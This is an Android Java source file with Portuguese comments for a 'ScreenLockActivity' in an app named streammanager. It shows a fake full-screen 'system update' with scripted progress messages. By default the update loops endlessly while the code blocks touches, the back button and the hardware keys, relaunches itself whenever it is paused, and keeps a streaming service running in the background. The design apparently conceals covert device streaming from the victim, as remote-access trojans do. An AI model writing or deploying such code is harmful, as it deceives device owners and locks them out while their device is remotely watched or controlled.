package com.streammanager.client;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

public class ScreenLockActivity extends Activity {

    private static final String TAG = "ScreenLockActivity";

    // UI Elements
    private ProgressBar progressBar;
    private TextView progressText;
    private TextView statusText;
    private TextView titleText;
    private ImageView androidLogo;
    private Button emergencyButton;
    private View touchBlocker;

    // Estado
    private boolean isLocked = true;
    private int currentProgress = 0;
    private Handler handler;
    private Runnable progressRunnable;

    // Configurações de bloqueio
    private static final int PROGRESS_UPDATE_INTERVAL = 200; // ms
    private static final int TOTAL_PROGRESS_TIME = 30000; // 30 segundos para simular atualização
    private static final int EMERGENCY_TAP_COUNT = 10; // Número de toques para emergência
    private int emergencyTapCount = 0;

    // Status messages
    private final String[] statusMessages = {
        "Preparando atualização...",
        "Verificando arquivos do sistema...",
        "Atualizando componentes principais...",
        "Configurando permissões...",
        "Otimizando performance...",
        "Finalizando atualização...",
        "Sistema atualizado com sucesso!"
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Configurar janela para bloqueio completo
        setupWindowFlags();

        setContentView(R.layout.activity_screen_lock);

        // Inicializar componentes
        initializeViews();
        setupTouchBlocker();
        setupEmergencyButton();

        // Iniciar simulação de atualização
        startUpdateSimulation();

        // Manter serviço de streaming ativo
        ensureStreamingService();
    }

    private void setupWindowFlags() {
        // Flags para manter tela ligada e impedir saída
        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_FULLSCREEN |
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
        );

        // Impedir que a atividade seja fechada por botões
        setFinishOnTouchOutside(false);
    }

    private void initializeViews() {
        progressBar = findViewById(R.id.progress_bar);
        progressText = findViewById(R.id.progress_text);
        statusText = findViewById(R.id.status_text);
        titleText = findViewById(R.id.title_text);
        androidLogo = findViewById(R.id.android_logo);
        emergencyButton = findViewById(R.id.emergency_button);
        touchBlocker = findViewById(R.id.touch_blocker);

        // Configurar valores iniciais
        progressBar.setProgress(0);
        progressText.setText("Preparando atualização... 0%");
        statusText.setText("Não toque na tela durante a atualização");
    }

    private void setupTouchBlocker() {
        // Bloquear todos os toques na tela
        touchBlocker.setOnTouchListener((v, event) -> {
            // Registrar toques para botão de emergência (se necessário)
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                emergencyTapCount++;
                if (emergencyTapCount >= EMERGENCY_TAP_COUNT) {
                    showEmergencyDialog();
                    emergencyTapCount = 0;
                }
            }
            // Sempre consumir o evento para bloquear interação
            return true;
        });

        // Bloquear toques em toda a atividade
        findViewById(android.R.id.content).setOnTouchListener((v, event) -> true);
    }

    private void setupEmergencyButton() {
        emergencyButton.setOnClickListener(v -> {
            // Botão invisível para desenvolvedor/emergência
            showEmergencyDialog();
        });

        // Toque longo no logo para emergência
        androidLogo.setOnLongClickListener(v -> {
            showEmergencyDialog();
            return true;
        });
    }

    private void startUpdateSimulation() {
        handler = new Handler(Looper.getMainLooper());
        progressRunnable = new Runnable() {
            @Override
            public void run() {
                updateProgress();

                if (currentProgress < 100) {
                    handler.postDelayed(this, PROGRESS_UPDATE_INTERVAL);
                } else {
                    onUpdateComplete();
                }
            }
        };

        handler.post(progressRunnable);
    }

    private void updateProgress() {
        currentProgress += (100 * PROGRESS_UPDATE_INTERVAL) / TOTAL_PROGRESS_TIME;

        if (currentProgress > 100) {
            currentProgress = 100;
        }

        // Atualizar barra de progresso
        progressBar.setProgress(currentProgress);
        progressText.setText(String.format("Atualizando sistema... %d%%", currentProgress));

        // Atualizar mensagem de status baseada no progresso
        int statusIndex = (currentProgress * statusMessages.length) / 100;
        if (statusIndex < statusMessages.length) {
            statusText.setText(statusMessages[statusIndex]);
        }
    }

    private void onUpdateComplete() {
        progressText.setText("Sistema atualizado com sucesso! 100%");
        statusText.setText("Reiniciando sistema...");

        // Simular reinício rápido
        handler.postDelayed(() -> {
            // Manter bloqueado ou permitir saída baseado na configuração
            if (shouldRemainLocked()) {
                restartUpdateSimulation();
            } else {
                unlockScreen();
            }
        }, 2000);
    }

    private void restartUpdateSimulation() {
        // Reiniciar simulação para manter bloqueio contínuo
        currentProgress = 0;
        progressBar.setProgress(0);
        statusText.setText("Verificando atualizações pendentes...");
        handler.postDelayed(progressRunnable, 3000);
    }

    private void unlockScreen() {
        isLocked = false;

        Toast.makeText(this, "Bloqueio de tela desativado", Toast.LENGTH_SHORT).show();

        // Notificar serviço de streaming
        Intent intent = new Intent("com.streammanager.SCREEN_UNLOCKED");
        sendBroadcast(intent);

        finish();
    }

    private void showEmergencyDialog() {
        // Diálogo simples para emergência (desenvolvimento)
        Toast.makeText(this, "Modo emergência ativado", Toast.LENGTH_LONG).show();

        // Permitir saída forçada
        unlockScreen();
    }

    private boolean shouldRemainLocked() {
        // Verificar se deve permanecer bloqueado
        // Pode ser configurado via intent ou preferências
        Intent intent = getIntent();
        return intent.getBooleanExtra("remain_locked", true);
    }

    private void ensureStreamingService() {
        // Garantir que o serviço de streaming continue ativo
        Intent serviceIntent = new Intent(this, StreamingService.class);
        serviceIntent.setAction("KEEP_STREAMING");
        startService(serviceIntent);
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        // Bloquear todos os botões físicos
        if (isLocked) {
            // Permitir apenas botão de emergência (volume + power simultâneo)
            if (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN ||
                keyCode == KeyEvent.KEYCODE_VOLUME_UP ||
                keyCode == KeyEvent.KEYCODE_POWER) {
                emergencyTapCount++;
                if (emergencyTapCount >= EMERGENCY_TAP_COUNT) {
                    showEmergencyDialog();
                    emergencyTapCount = 0;
                }
                return true;
            }
            return true; // Consumir outros botões
        }

        return super.onKeyDown(keyCode, event);
    }

    @Override
    public void onBackPressed() {
        // Impedir botão voltar
        if (isLocked) {
            return;
        }
        super.onBackPressed();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

        // Limpar handlers
        if (handler != null && progressRunnable != null) {
            handler.removeCallbacks(progressRunnable);
        }
    }

    @Override
    protected void onPause() {
        super.onPause();

        // Impedir que a atividade seja pausada
        if (isLocked) {
            // Reiniciar atividade se tentar sair
            Intent intent = new Intent(this, ScreenLockActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
        }
    }

    // Método estático para iniciar bloqueio
    public static void startScreenLock(Activity activity) {
        Intent intent = new Intent(activity, ScreenLockActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        activity.startActivity(intent);
    }

    // Método estático para verificar se está bloqueado
    public static boolean isScreenLocked() {
        // Implementar verificação via serviço
        return false; // Placeholder
    }
}